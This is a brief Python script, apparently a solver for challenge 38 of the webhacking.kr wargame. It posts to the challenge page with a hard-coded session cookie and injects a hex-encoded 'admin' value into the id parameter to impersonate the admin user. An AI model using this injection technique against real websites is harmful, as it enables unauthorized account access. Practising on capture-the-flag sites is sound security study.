import requests

url='http://webhacking.kr/challenge/web/web-38/index.php?id='
cookies={'PHPSESSID':'brieopfbm174l5pldrp06it4c5'}
get_param="0x61646d696e id" #0x61646d696e ="admin".encode("hex")
url=url+get_param
print url
response=requests.post(url,cookies=cookies)
print response.text